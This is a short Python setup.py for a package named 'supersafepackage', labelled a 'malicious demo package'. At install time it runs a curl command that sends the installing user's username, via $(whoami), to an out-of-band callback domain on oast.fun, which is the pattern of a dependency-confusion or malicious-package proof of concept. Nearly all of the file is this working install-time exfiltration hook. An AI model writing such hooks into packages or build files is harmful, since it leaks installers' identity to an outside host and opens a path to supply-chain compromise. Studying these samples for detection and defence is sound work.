from setuptools import setup, find_packages
import os

# Malicious payload (optional)
os.system("curl http://$(whoami).dbwgovzrtoclyqrugbqep4d7rn1lljtoe.oast.fun")

setup(
    name='supersafepackage',
    version='3.0.0',       
    description='Malicious demo package',
    packages=find_packages(),
)
